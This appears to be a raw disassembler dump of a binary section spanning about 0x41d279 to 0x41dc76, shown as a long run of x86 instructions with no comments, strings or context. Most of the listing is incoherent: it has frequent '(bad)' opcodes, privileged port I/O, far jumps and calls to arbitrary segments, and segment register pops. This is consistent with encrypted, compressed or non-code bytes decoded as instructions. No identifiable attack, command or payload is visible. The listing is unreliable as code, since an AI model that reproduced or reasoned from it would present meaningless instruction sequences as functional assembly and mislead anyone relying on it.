  41d279:	sbb    DWORD PTR [ecx-0x5026e4d0],eax
  41d27f:	jmp    FWORD PTR ds:0xc8950cbf
  41d285:	sub    BYTE PTR [edi],0x49
  41d288:	rcr    BYTE PTR [edx-0x2c],0xdf
  41d28c:	pop    ebx
  41d28d:	mov    eax,0x5b1894b8
  41d292:	and    BYTE PTR [ecx],bh
  41d294:	stc    
  41d295:	inc    eax
  41d296:	pop    ss
  41d297:	call   0xe77f61a3
  41d29c:	fdivr  DWORD PTR [ebp+0x4e]
  41d29f:	sbb    cl,BYTE PTR [esi+0x5e]
  41d2a2:	(bad)  [edi+0x2cc0e7a4]
  41d2a8:	in     al,dx
  41d2a9:	sub    DWORD PTR [edx+0x6cfd030],edi
  41d2af:	sbb    eax,0x25b002ca
  41d2b4:	pop    esi
  41d2b5:	push   esi
  41d2b6:	and    ecx,DWORD PTR ds:[edi-0xd554d88]
  41d2bd:	cmc    
  41d2be:	pop    eax
  41d2bf:	add    eax,DWORD PTR [ebx]
  41d2c1:	icebp  
  41d2c2:	in     eax,0x8d
  41d2c4:	into   
  41d2c5:	xor    al,0xf
  41d2c7:	sub    ebx,DWORD PTR [edx]
  41d2c9:	xchg   ebx,eax
  41d2ca:	xchg   edi,eax
  41d2cb:	dec    eax
  41d2cc:	out    0x14,eax
  41d2ce:	mov    al,0xa0
  41d2d0:	call   0x6d3b:0xb8407ff1
  41d2d7:	aaa    
  41d2d8:	dec    edi
  41d2d9:	push   ebp
  41d2da:	in     al,dx
  41d2db:	pop    edi
  41d2dc:	sub    DWORD PTR [eax-0x30],eax
  41d2df:	mov    bh,0xce
  41d2e1:	mov    ch,0xce
  41d2e3:	arpl   WORD PTR [ebx],sp
  41d2e5:	clc    
  41d2e6:	or     eax,0x36a6ccd4
  41d2eb:	sub    esp,DWORD PTR [edi-0x27]
  41d2ee:	mov    DWORD PTR [edi],ebp
  41d2f0:	cwde   
  41d2f1:	cmp    esp,edx
  41d2f3:	imul   DWORD PTR [eax-0x45]
  41d2f6:	sar    DWORD PTR [eax+0x8ede801],cl
  41d2fc:	dec    ebx
  41d2fd:	mov    eax,ds:0x26527c57
  41d302:	pop    edi
  41d303:	enter  0x581a,0xbb
  41d307:	jae    0x41d29c
  41d309:	pop    eax
  41d30a:	and    DWORD PTR [esi+0x139d23e8],ebx
	...
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	dec    ebp
  41d381:	push   ds
  41d382:	inc    eax
  41d383:	push   ss
  41d384:	push   0x4000136
  41d389:	add    DWORD PTR [eax],eax
  41d38b:	add    BYTE PTR [ebx+edx*8-0xc5fa501],ah
  41d392:	das    
  41d393:	jp     0x41d315
  41d395:	ret    0xec35
  41d398:	xor    DWORD PTR [si-0x5f89],0xd250a82d
  41d3a1:	mov    ecx,ecx
  41d3a3:	mov    esi,0xdb0e921a
  41d3a8:	(bad)  
  41d3a9:	pop    edi
  41d3aa:	outs   dx,BYTE PTR ds:[esi]
  41d3ab:	jg     0x41d35f
  41d3ad:	or     cl,BYTE PTR [ebx-0x14feb14d]
  41d3b3:	daa    
  41d3b4:	mov    esp,0x21008d12
  41d3b9:	mov    esp,DWORD PTR [ebx]
  41d3bb:	mov    ah,0x79
  41d3bd:	idiv   DWORD PTR [ecx-0x49d9f033]
  41d3c3:	repnz shl DWORD PTR gs:[esi+0x6e],0x1c
  41d3c9:	shr    ebx,1
  41d3cb:	pop    edx
  41d3cc:	push   ecx
  41d3cd:	jecxz  0x41d3ef
  41d3cf:	stc    
  41d3d0:	pop    ss
  41d3d1:	call   0xcccb:0xc447d1df
  41d3d8:	je     0x41d40a
  41d3da:	inc    ebx
  41d3db:	cmovs  ebp,DWORD PTR [edi+0x9]
  41d3df:	push   0x32d50139
  41d3e4:	and    eax,0x5572fbed
  41d3e9:	lock js 0x41d397
  41d3ec:	in     eax,dx
  41d3ed:	pop    ss
  41d3ee:	pop    edx
  41d3ef:	fisttp WORD PTR [ecx]
  41d3f1:	xor    DWORD PTR [esi-0x6609f097],edi
  41d3f7:	ret    
  41d3f8:	jno    0x41d3fe
  41d3fa:	xor    al,0x38
  41d3fc:	sbb    BYTE PTR ds:0x1c553c66,bl
  41d402:	add    eax,DWORD PTR [ecx]
  41d404:	sbb    ebp,DWORD PTR [edx-0x27c27cba]
  41d40a:	jae    0x41d439
  41d40c:	adc    al,0xd3
  41d40e:	pop    esi
  41d40f:	ja     0x41d3a6
  41d411:	adc    al,0xc6
  41d413:	retf   
  41d414:	lock nop
  41d416:	mov    al,0xac
  41d418:	add    DWORD PTR [esi+0x18],0x67a5b84c
  41d41f:	mov    DWORD PTR [edi],eax
  41d421:	xchg   esp,eax
  41d422:	cmp    DWORD PTR [ecx+eax*4+0x62],ecx
  41d426:	std    
  41d427:	mov    esi,0xad6f2362
  41d42c:	jmp    0x41d449
  41d42e:	int3   
  41d42f:	sbb    BYTE PTR [ebx],bh
  41d431:	ficom  WORD PTR [edi-0x61]
  41d434:	sub    BYTE PTR [ebx],dl
  41d436:	nop
  41d437:	pop    ecx
  41d438:	out    0x7d,eax
  41d43a:	lods   al,BYTE PTR ds:[esi]
  41d43b:	xlat   BYTE PTR ds:[ebx]
  41d43c:	mov    ah,0x2f
  41d43e:	cdq    
  41d43f:	or     esi,DWORD PTR [si+0x66]
  41d443:	dec    esi
  41d444:	push   esi
  41d445:	xor    al,0x4e
  41d447:	cmp    DWORD PTR [ebp+0x3f98c5c8],esi
  41d44d:	inc    esi
  41d44e:	int    0xd
  41d450:	fisttp DWORD PTR [ebx+0x14b9cf85]
  41d456:	leave  
  41d457:	fbstp  TBYTE PTR [eax+0x3a]
  41d45a:	(bad)  
  41d45b:	ja     0x41d4a7
  41d45d:	cmp    al,0xc2
  41d45f:	sub    eax,0x9724d048
  41d464:	mov    dh,0xe3
  41d466:	(bad)  
  41d468:	dec    ecx
  41d469:	addr16 xor al,0x27
  41d46c:	int    0xa9
  41d46e:	dec    eax
  41d46f:	cmp    bl,ah
  41d471:	jae    0x41d496
  41d473:	mov    ah,0x40
  41d475:	(bad)  
  41d476:	in     eax,0x19
  41d478:	scas   eax,DWORD PTR es:[edi]
  41d479:	stos   BYTE PTR es:[edi],al
  41d47a:	aad    0x8
  41d47c:	inc    ecx
  41d47d:	jnp    0x41d40f
  41d47f:	icebp  
  41d480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d481:	push   cs
  41d482:	pushf  
  41d483:	sti    
  41d484:	popa   
  41d485:	aam    0xf2
  41d487:	mov    esp,0x769a754d
  41d48c:	fiadd  WORD PTR [edx+0x3899]
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6c32:0xde394e89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	cmp    al,0xfe
  41d50e:	or     ah,cl
  41d510:	jp     0x41d4cd
  41d512:	sahf   
  41d513:	(bad)  
  41d514:	test   eax,0xb90aee4f
  41d519:	dec    BYTE PTR [esp+ebx*4]
  41d51c:	ret    
  41d51d:	sub    eax,0x35e8b5e7
  41d522:	sbb    al,0xa7
  41d524:	fcom   QWORD PTR [ebp-0x602f9103]
  41d52a:	in     al,dx
  41d52b:	mov    cl,0x53
  41d52d:	mov    ah,0x90
  41d52f:	mov    eax,0xaede6f2c
  41d534:	test   DWORD PTR [ebx-0xb],0x913b66de
  41d53b:	jo     0x41d4d4
  41d53d:	lock loopne 0x41d5b7
  41d540:	add    ah,BYTE PTR [esi+edi*2-0x6c]
  41d544:	add    dl,dh
  41d546:	mov    DWORD PTR [edx+0x6af00e3d],edx
  41d54c:	mov    ch,0xc9
  41d54e:	stos   DWORD PTR es:[edi],eax
  41d54f:	sub    DWORD PTR [ebp-0x53],edi
  41d552:	fisub  DWORD PTR [ebx+0x189f75d9]
  41d558:	adc    DWORD PTR [eax],edi
  41d55a:	xchg   esp,eax
  41d55b:	jns    0x41d5d5
  41d55d:	mov    eax,ds:0x84902b6b
  41d562:	add    ebx,DWORD PTR [esi-0x57]
  41d565:	fist   WORD PTR [esi]
  41d567:	fxch   st(0)
  41d569:	mov    BYTE PTR [ebp-0x22],dh
  41d56c:	push   ecx
  41d56d:	jmp    0x41d572
  41d56f:	ss jl  0x41d5b4
  41d572:	ins    DWORD PTR es:[edi],dx
  41d573:	xchg   ebp,eax
  41d574:	or     eax,0x151b078d
  41d579:	test   al,0xc7
  41d57b:	add    dh,BYTE PTR [ebp-0x6d0b4160]
  41d581:	fdivr  QWORD PTR [edi]
  41d583:	jl     0x41d5ed
  41d585:	mov    DWORD PTR [edi-0x279eea7a],esp
  41d58b:	sub    eax,0x685e47fa
  41d590:	cmc    
  41d591:	jo     0x41d583
  41d593:	and    eax,0xee8d68a9
  41d598:	sbb    ch,BYTE PTR [eax-0x50940255]
  41d59e:	sbb    dl,BYTE PTR [edi+0x33]
  41d5a1:	psadbw mm6,QWORD PTR [ecx-0xf]
  41d5a5:	push   es
  41d5a6:	out    0x1b,al
  41d5a8:	push   ebx
  41d5a9:	js     0x41d60f
  41d5ab:	mov    al,ds:0x47b0b80b
  41d5b0:	(bad)  
  41d5b3:	cli    
  41d5b4:	mov    ah,0xd2
  41d5b6:	pop    ebx
  41d5b7:	jo     0x41d5a3
  41d5b9:	inc    esi
  41d5ba:	mov    ds:0xdddf34f2,al
  41d5bf:	cwde   
  41d5c0:	pop    ss
  41d5c1:	xchg   ebp,eax
  41d5c2:	push   es
  41d5c3:	test   BYTE PTR [ebp-0x65],al
  41d5c6:	ins    BYTE PTR es:[edi],dx
  41d5c7:	das    
  41d5c8:	push   0x5711fa10
  41d5cd:	push   ecx
  41d5ce:	mov    ds:0x451a0eb4,al
  41d5d3:	in     al,dx
  41d5d4:	lds    eax,FWORD PTR [esi]
  41d5d6:	push   ss
  41d5d7:	pop    DWORD PTR [eax]
  41d5d9:	jmp    0x41d5ef
  41d5db:	adc    eax,0xdfd542de
  41d5e0:	mov    ds:0x2af99be3,al
  41d5e5:	inc    esi
  41d5e6:	jmp    0x41d5f3
  41d5e8:	in     al,dx
  41d5e9:	adc    BYTE PTR [esi],bh
  41d5eb:	and    eax,0x823fe8fe
  41d5f0:	adc    dh,BYTE PTR [edi]
  41d5f2:	jmp    0xf3577ec9
  41d5f7:	and    ch,ch
  41d5f9:	pusha  
  41d5fa:	mov    ah,0x48
  41d5fc:	or     eax,0x466aa654
  41d601:	loope  0x41d61c
  41d603:	xlat   BYTE PTR ds:[ebx]
  41d604:	clc    
  41d605:	ret    0x4339
  41d608:	sub    DWORD PTR [ecx-0x58],esi
  41d60b:	aaa    
  41d60c:	mov    esi,0xaab024
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x2c66e435
  41d681:	lods   eax,DWORD PTR ds:[esi]
  41d682:	jle    0x41d67d
  41d684:	jo     0x41d6be
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    al,0x1
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	aad    0xfe
  41d68e:	sbb    DWORD PTR [ebp-0x6a84b1b2],edx
  41d694:	int    0xff
  41d696:	cmp    BYTE PTR [ebp+0x4eae53ce],0x13
  41d69d:	in     eax,0x8a
  41d69f:	mov    esp,ebx
  41d6a1:	sub    al,0xca
  41d6a3:	(bad)  
  41d6a4:	mov    ebp,0x53bb9e97
  41d6a9:	jnp    0x41d6ec
  41d6ab:	loop   0x41d636
  41d6ad:	repz cwde 
  41d6af:	inc    esi
  41d6b0:	jae    0x41d6a6
  41d6b2:	sbb    eax,0x4d4ae8d5
  41d6b7:	stos   DWORD PTR es:[edi],eax
  41d6b8:	sbb    esi,DWORD PTR [eax+0x6bafe99f]
  41d6be:	popf   
  41d6bf:	cmp    esp,DWORD PTR [ebx+0x70]
  41d6c2:	sub    BYTE PTR [eax],cl
  41d6c4:	stc    
  41d6c5:	cmp    ebp,DWORD PTR [eax]
  41d6c7:	fmul   st(6),st
  41d6c9:	sub    eax,0x6f479507
  41d6ce:	sahf   
  41d6cf:	xchg   esi,eax
  41d6d0:	int3   
  41d6d1:	xor    ah,dl
  41d6d3:	cmp    al,0xab
  41d6d5:	pop    ss
  41d6d6:	pop    es
  41d6d7:	(bad)  
  41d6d8:	enter  0x5ee0,0x19
  41d6dc:	cmp    al,0xef
  41d6de:	out    dx,al
  41d6df:	xchg   DWORD PTR [esi-0x62aff29b],edx
  41d6e5:	ss inc edi
  41d6e7:	rol    ah,0xa3
  41d6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6eb:	ror    DWORD PTR [ebp+0x6d],0x7b
  41d6ef:	test   DWORD PTR [edx+0x41],edx
  41d6f2:	dec    edx
  41d6f3:	lds    esi,FWORD PTR [edi+0x571b229]
  41d6f9:	data16 ja 0x41d6e2
  41d6fc:	addr16 add dh,dh
  41d6ff:	out    0x87,al
  41d701:	loope  0x41d72a
  41d703:	jle    0x41d688
  41d705:	pop    es
  41d706:	xchg   ecx,eax
  41d707:	dec    eax
  41d708:	mov    ah,0x4c
  41d70a:	jnp    0x41d6bb
  41d70c:	es std 
  41d70e:	cmp    DWORD PTR [ecx+0x7e6d7ecd],esi
  41d714:	rol    DWORD PTR [eax+0x3da9000b],1
  41d71a:	jge    0x41d719
  41d71c:	imul   ecx,DWORD PTR [ebp+0xf769d6c],0x7e7c93b0
  41d726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d727:	test   al,0x9e
  41d729:	push   es
  41d72a:	jge    0x41d6ac
  41d72c:	out    0x14,eax
  41d72e:	cmp    DWORD PTR [eax],ebp
  41d730:	jp     0x41d795
  41d732:	push   DWORD PTR [ecx-0x5d]
  41d735:	jmp    0x41d6c6
  41d737:	cmp    al,0xd4
  41d739:	fsub   DWORD PTR [edx-0x39ac95c4]
  41d73f:	loope  0x41d6e0
  41d741:	inc    ebx
  41d742:	ds gs mov eax,0xd44289c6
  41d749:	bound  esp,QWORD PTR [ebx+0x60]
  41d74c:	jp     0x41d793
  41d74e:	popf   
  41d74f:	outs   dx,BYTE PTR ds:[esi]
  41d750:	mov    al,ds:0x9b6813d1
  41d755:	push   ss
  41d756:	push   es
  41d757:	mov    esi,0xf89aeae5
  41d75c:	neg    BYTE PTR [ebx-0x11]
  41d75f:	mov    BYTE PTR [ebp-0x1f],ah
  41d762:	push   esi
  41d763:	sbb    BYTE PTR [ebp-0x34680035],0xa3
  41d76a:	sub    al,0xe3
  41d76c:	and    al,0xf5
  41d76e:	inc    edx
  41d76f:	sub    al,BYTE PTR [esi]
  41d771:	mov    dh,dl
  41d773:	pop    es
  41d774:	fdivr  st(6),st
  41d776:	pop    ds
  41d777:	adc    BYTE PTR [esi],dl
  41d779:	mov    bh,0x3f
  41d77b:	add    eax,0x4674b293
  41d780:	xor    BYTE PTR [ebx],ah
  41d782:	jno    0x41d748
  41d784:	jmp    0x5cc7:0xe29c2662
  41d78b:	pop    ds
  41d78c:	jg     0x41d71f
  41d78e:	adc    DWORD PTR [esi+0x0],edi
	...
  41d7f1:	add    BYTE PTR [eax],al
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	je     0x41d866
  41d802:	jmp    0x41d836
  41d804:	je     0x41d83f
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	ins    BYTE PTR es:[edi],dx
  41d80d:	sub    ch,0xbe
  41d810:	pop    ss
  41d811:	mov    ebp,DWORD PTR [edx-0x1cc0a501]
  41d817:	add    ah,BYTE PTR [ebx]
  41d819:	and    eax,0xac974e46
  41d81e:	mov    ah,0x10
  41d820:	sbb    esi,ecx
  41d822:	push   esp
  41d823:	ficom  WORD PTR [ecx+0x76455412]
  41d829:	mov    ebp,0xab7dd2dd
  41d82e:	add    ah,dl
  41d830:	jbe    0x41d7d0
  41d832:	jecxz  0x41d839
  41d834:	ret    0x2df1
  41d837:	push   0xffffffb6
  41d839:	inc    esi
  41d83a:	aaa    
  41d83b:	stc    
  41d83c:	sbb    ecx,edx
  41d83e:	mov    ebp,0x71a5da88
  41d843:	pop    esi
  41d844:	sti    
  41d845:	test   edx,0x474f1463
  41d84b:	pop    ebp
  41d84c:	(bad)  
  41d84d:	das    
  41d84e:	jmp    0x41d8be
  41d850:	lahf   
  41d851:	mov    esp,0x295440b9
  41d856:	hlt    
  41d857:	dec    edx
  41d858:	mov    eax,ds:0x5c1646ab
  41d85d:	(bad)  
  41d85e:	push   ss
  41d85f:	enter  0xf2c6,0xfb
  41d863:	mov    bl,BYTE PTR [eax+0x643421a0]
  41d869:	(bad)  
  41d86a:	scas   al,BYTE PTR es:[edi]
  41d86b:	(bad)  
  41d86c:	stos   DWORD PTR es:[edi],eax
  41d86d:	mov    ebx,0xd7813128
  41d872:	dec    ebp
  41d873:	sub    eax,0xa0f65d60
  41d878:	sub    eax,0x2b30a358
  41d87d:	or     BYTE PTR [ebx],0x2a
  41d880:	push   edi
  41d881:	jp     0x41d83d
  41d883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d884:	dec    ebp
  41d885:	gs jge 0x41d8ce
  41d888:	add    DWORD PTR [esi-0x21],edi
  41d88b:	(bad)  
  41d88c:	stc    
  41d88d:	pop    edx
  41d88e:	push   esi
  41d88f:	test   al,0xe6
  41d891:	iret   
  41d892:	ja     0x41d8bc
  41d894:	mov    esi,0x5d767861
  41d899:	dec    ebp
  41d89a:	das    
  41d89b:	nop
  41d89c:	es leave 
  41d89e:	ja     0x41d8da
  41d8a0:	mov    BYTE PTR [edi],al
  41d8a2:	icebp  
  41d8a3:	push   ebx
  41d8a4:	add    esi,DWORD PTR [ecx]
  41d8a6:	rcl    DWORD PTR [ebx+0x46],1
  41d8a9:	cld    
  41d8aa:	addr16 inc edx
  41d8ac:	ins    DWORD PTR es:[edi],dx
  41d8ad:	mov    edx,0x6a3b0979
  41d8b2:	pop    ss
  41d8b3:	cwde   
  41d8b4:	lea    edx,[edx-0x5]
  41d8b7:	cdq    
  41d8b8:	add    ebx,DWORD PTR [edi+eiz*8-0x68c66cbe]
  41d8bf:	test   al,0x3c
  41d8c1:	test   BYTE PTR [edi-0x46f2870d],bh
  41d8c7:	cmp    dl,BYTE PTR [edx-0x4ffebdbe]
  41d8cd:	call   0xac58:0xd18c6fb9
  41d8d4:	jl     0x41d8d8
  41d8d6:	add    ebx,esi
  41d8d8:	and    bl,dl
  41d8da:	rcl    ebp,cl
  41d8dc:	pushf  
  41d8dd:	jb     0x41d8ad
  41d8df:	int3   
  41d8e0:	push   ss
  41d8e1:	retf   0x8566
  41d8e4:	repnz sub BYTE PTR [edx+0x39],ch
  41d8e8:	sbb    eax,0x88393493
  41d8ed:	cld    
  41d8ee:	aam    0xe9
  41d8f0:	arpl   WORD PTR [esi],sp
  41d8f2:	mov    dh,0x30
  41d8f4:	inc    ecx
  41d8f5:	mov    eax,0x6464bf86
  41d8fa:	pop    es
  41d8fb:	retf   
  41d8fc:	cdq    
  41d8fd:	scas   eax,DWORD PTR es:[edi]
  41d8fe:	dec    eax
  41d8ff:	(bad)  
  41d900:	pop    ebp
  41d901:	sub    al,0x80
  41d903:	cmp    al,0x2e
  41d905:	push   eax
  41d906:	call   0x1bd9c489
  41d90b:	jp     0x41d961
  41d90d:	mov    bh,0xec
  41d90f:	sub    DWORD PTR [eax],eax
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	imul   ebx,DWORD PTR gs:[ebp-0x1b],0x13a7877
  41d987:	add    BYTE PTR [ecx+eax*1],al
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	push   ebx
  41d98d:	xor    DWORD PTR [esi+0x60bf523e],0x64
  41d994:	xchg   ebx,eax
  41d995:	push   ebx
  41d996:	addr16 fsubr st,st(6)
  41d999:	in     eax,dx
  41d99a:	inc    ebp
  41d99b:	jb     0x41d9f5
  41d99d:	popf   
  41d99e:	stos   DWORD PTR es:[edi],eax
  41d99f:	stos   DWORD PTR es:[edi],eax
  41d9a0:	lea    edi,[eax+0x4]
  41d9a3:	sahf   
  41d9a4:	push   edx
  41d9a5:	pop    edx
  41d9a6:	adc    al,0xc1
  41d9a8:	jb     0x41d95b
  41d9aa:	sub    ebx,DWORD PTR [ebx]
  41d9ac:	or     esp,DWORD PTR [ebx+0x25904b21]
  41d9b2:	daa    
  41d9b3:	adc    al,ah
  41d9b5:	mov    bl,0xbc
  41d9b7:	jmp    0xd07c:0x1871dc55
  41d9be:	jns    0x41d9be
  41d9c0:	fidivr WORD PTR [edx+0x3c]
  41d9c3:	dec    edx
  41d9c4:	mov    ?,edx
  41d9c6:	mov    ds:0xcd10bb81,eax
  41d9cb:	frstor [esi-0x35]
  41d9ce:	mov    esp,edx
  41d9d0:	test   al,0xf
  41d9d2:	cmc    
  41d9d3:	pop    ss
  41d9d4:	adc    al,0x43
  41d9d6:	loope  0x41da15
  41d9d8:	xor    ebp,edi
  41d9da:	cmp    BYTE PTR [ebx-0x1a],dl
  41d9dd:	push   ss
  41d9de:	or     esp,DWORD PTR [edi+edx*2+0x6a8bab4b]
  41d9e5:	ds hlt 
  41d9e7:	pop    ss
  41d9e8:	cmp    ch,ah
  41d9ea:	push   esi
  41d9eb:	inc    eax
  41d9ec:	ret    0x5e18
  41d9ef:	fcmovnbe st,st(4)
  41d9f1:	sbb    edx,DWORD PTR [edx-0x37cb271e]
  41d9f7:	scas   al,BYTE PTR es:[edi]
  41d9f8:	sub    DWORD PTR [esi],eax
  41d9fa:	mov    ds:0x1ff7c6c2,al
  41d9ff:	push   esi
  41da00:	and    al,0x9b
  41da02:	loope  0x41da48
  41da04:	jl     0x41d9dc
  41da06:	or     al,0x3f
  41da08:	push   edx
  41da09:	xchg   DWORD PTR [esi],ebx
  41da0b:	xor    DWORD PTR [edi+ebp*8],ecx
  41da0e:	(bad)  [ecx-0x9]
  41da12:	xlat   BYTE PTR ds:[ebx]
  41da13:	jnp    0x41da27
  41da15:	add    al,0x5b
  41da17:	cdq    
  41da18:	sbb    bl,BYTE PTR [edi+edx*1-0x52]
  41da1c:	mov    ds:0xdff18c59,al
  41da21:	add    DWORD PTR [ebx+0x2b],0x7b
  41da25:	pop    edi
  41da26:	push   ebp
  41da27:	and    BYTE PTR [edx],dl
  41da29:	jne    0x41da44
  41da2b:	call   0xa7c89f0
  41da30:	idiv   DWORD PTR [eax]
  41da32:	cmp    bl,BYTE PTR ds:0x3ecf86af
  41da38:	push   eax
  41da39:	retf   
  41da3a:	jb     0x41da49
  41da3c:	cwde   
  41da3d:	lods   al,BYTE PTR ds:[esi]
  41da3e:	inc    esi
  41da3f:	out    dx,al
  41da40:	sar    edi,0x1
  41da43:	je     0x41dabb
  41da45:	sbb    DWORD PTR [esi],edi
  41da47:	aas    
  41da48:	inc    ecx
  41da49:	dec    esp
  41da4a:	pop    edx
  41da4b:	ins    DWORD PTR es:[edi],dx
  41da4c:	loope  0x41da87
  41da4e:	mov    bl,0x50
  41da50:	lods   al,BYTE PTR ds:[esi]
  41da51:	and    ebp,edi
  41da53:	xor    edi,0xfffffff4
  41da56:	push   cs
  41da57:	fs and dx,dx
  41da5b:	mov    esp,0x8a5df01b
  41da60:	dec    esp
  41da61:	fs repnz mov bh,0x10
  41da65:	dec    ebx
  41da66:	repz push ds
  41da68:	scas   eax,DWORD PTR es:[edi]
  41da69:	xchg   al,ch
  41da6b:	inc    edi
  41da6c:	call   0xaddd0b98
  41da71:	jl     0x41d9f7
  41da73:	pop    es
  41da74:	(bad)  
  41da75:	mov    cl,0x99
  41da77:	and    edx,0xa59cdc66
  41da7d:	fld    DWORD PTR [ebx-0x63]
  41da80:	adc    ecx,DWORD PTR [ebx]
  41da82:	int    0x5f
  41da84:	xor    DWORD PTR [ebx],eax
  41da86:	push   ecx
  41da87:	leave  
  41da88:	sub    al,0xf7
  41da8a:	lods   eax,DWORD PTR cs:[esi]
  41da8c:	and    DWORD PTR [eax+0x938a],esi
	...
  41daf2:	add    BYTE PTR [eax],al
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x4d
  41db01:	stc    
  41db02:	or     dh,BYTE PTR ds:0x13b7c
  41db08:	add    al,0x1
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	mov    ecx,0x19842bd0
  41db11:	dec    ebx
  41db12:	mul    bl
  41db14:	data16 mov dl,0x4c
  41db17:	ret    0x67e6
  41db1a:	jne    0x41db48
  41db1c:	test   ah,bh
  41db1e:	sub    ah,BYTE PTR ds:0x83099695
  41db24:	ins    DWORD PTR es:[edi],dx
  41db25:	mov    bh,0xac
  41db27:	and    esp,DWORD PTR [ecx]
  41db29:	iret   
  41db2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db2b:	mov    ds:0xdc55e708,eax
  41db30:	ret    
  41db31:	pop    eax
  41db32:	scas   al,BYTE PTR es:[edi]
  41db33:	sub    eax,0xb11456b0
  41db38:	add    eax,0x71de7d7d
  41db3d:	int3   
  41db3e:	mov    ds:0xc8e96c0e,al
  41db43:	mov    ss,WORD PTR [eax-0xc4e5cdc]
  41db49:	fcmovnbe st,st(2)
  41db4b:	aam    0x85
  41db4d:	stc    
  41db4e:	sti    
  41db4f:	lods   al,BYTE PTR ds:[esi]
  41db50:	or     al,0x8a
  41db52:	das    
  41db53:	out    0x3b,al
  41db55:	scas   eax,DWORD PTR es:[edi]
  41db56:	outs   dx,DWORD PTR ds:[esi]
  41db57:	cmc    
  41db58:	push   ebx
  41db59:	lods   al,BYTE PTR ds:[esi]
  41db5a:	xor    ebx,0xaddaaa39
  41db60:	push   0xffffffc0
  41db62:	push   edx
  41db63:	or     al,0x19
  41db65:	int3   
  41db66:	aad    0x97
  41db68:	xor    al,0xa1
  41db6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db6b:	xchg   esi,eax
  41db6c:	xchg   ebp,eax
  41db6d:	mov    edi,ecx
  41db6f:	jne    0x41dba6
  41db71:	das    
  41db72:	jmp    0xb031:0xc6232eb5
  41db79:	ret    
  41db7a:	pusha  
  41db7b:	adc    dl,BYTE PTR [esi+0x4035aa87]
  41db81:	mov    esp,0x7621c42
  41db86:	pop    ss
  41db87:	psubusw mm1,QWORD PTR [ecx+ecx*2-0x20abcee6]
  41db8f:	or     BYTE PTR [edi-0x7cdb3f9b],bh
  41db95:	push   es
  41db96:	mov    esp,0x2de1a73e
  41db9b:	ins    BYTE PTR es:[edi],dx
  41db9c:	cmp    eax,0xbc56bb45
  41dba1:	mov    al,ds:0xe777728f
  41dba6:	psrlq  mm0,QWORD PTR [ecx+ebx*4]
  41dbaa:	ins    DWORD PTR es:[edi],dx
  41dbab:	inc    edx
  41dbac:	ror    DWORD PTR [ebp+0x1a],cl
  41dbaf:	push   ebx
  41dbb0:	mov    dl,0xd8
  41dbb2:	lock stos BYTE PTR es:[edi],al
  41dbb4:	push   eax
  41dbb5:	jb     0x41dc1f
  41dbb7:	popa   
  41dbb8:	sbb    dh,BYTE PTR [ecx]
  41dbba:	pop    ds
  41dbbb:	in     al,0x21
  41dbbd:	cs xor al,0x9c
  41dbc0:	cli    
  41dbc1:	adc    eax,0x3ef606f5
  41dbc6:	adc    eax,DWORD PTR [edi+0x6f]
  41dbc9:	pop    ecx
  41dbca:	add    eax,0x1bea54dd
  41dbcf:	mov    cs,esi
  41dbd1:	xor    al,BYTE PTR [edx-0x7e]
  41dbd4:	ror    edx,cl
  41dbd6:	xor    BYTE PTR [ebx-0x267ebaa3],0xa3
  41dbdd:	je     0x41dbf2
  41dbdf:	push   eax
  41dbe0:	retf   0x6e68
  41dbe3:	fwait
  41dbe4:	or     cl,BYTE PTR [eax+0x29]
  41dbe7:	jb     0x41db9a
  41dbe9:	cdq    
  41dbea:	push   ebp
  41dbeb:	dec    esi
  41dbec:	push   esi
  41dbed:	adc    eax,DWORD PTR [edx]
  41dbef:	cli    
  41dbf0:	inc    esp
  41dbf1:	adc    ebp,esp
  41dbf3:	cmc    
  41dbf4:	push   edi
  41dbf5:	push   ebx
  41dbf6:	clc    
  41dbf7:	adc    edi,ecx
  41dbf9:	mov    al,ds:0x158faaa0
  41dbfe:	or     esi,0x19
  41dc01:	out    0xff,eax
  41dc03:	mov    esp,0x1fab8d87
  41dc08:	pop    edi
  41dc09:	jo     0x41dc08
  41dc0b:	cmp    ah,dl
  41dc0d:	sar    DWORD PTR [esi],1
  41dc0f:	mov    cl,0x0
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
